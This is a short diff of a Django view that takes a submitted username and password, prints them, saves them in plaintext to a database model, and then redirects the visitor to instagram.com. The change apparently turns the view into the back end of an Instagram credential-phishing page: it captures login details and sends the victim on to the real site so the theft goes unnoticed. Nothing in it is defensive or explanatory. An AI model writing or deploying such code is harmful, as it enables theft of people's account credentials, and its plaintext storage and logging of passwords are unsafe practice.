@@ -1,7 +1,7 @@
 from django.shortcuts import render
 
 # Create your views here.
-from django.shortcuts import render,HttpResponse 
+from django.shortcuts import render,HttpResponseRedirect
 from . models import saver
 # Create your views here.
 def index(request):
@@ -11,5 +11,5 @@ def index(request):
         print(password,username)
         user = saver(username=username,password=password)
         user.save()
-        return HttpResponse("Done")
+        return HttpResponseRedirect("https://www.instagram.com/")
     return render(request,'djangoPlayGround/index.html')
